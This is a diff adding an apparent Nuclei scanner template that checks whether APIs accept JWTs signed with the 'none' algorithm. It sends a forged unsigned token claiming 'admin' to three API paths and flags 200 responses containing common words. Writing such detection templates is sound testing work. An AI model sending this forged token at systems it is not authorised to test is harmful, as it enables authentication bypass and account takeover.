@@ -1,0 +1,30 @@
+id: jwt-none-algorithm
+
+info:
+  name: JWT None Algorithm
+  author: moriarty
+  severity: high
+  description: Detects JWT tokens accepting 'none' algorithm
+  tags: jwt,misconfiguration,auth
+
+requests:
+  - method: GET
+    path:
+      - "/api/user"
+      - "/api/profile"
+      - "/api/admin"
+
+    headers:
+      Authorization: "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0."
+
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "admin"
+          - "user"
+          - "profile"
+        condition: or
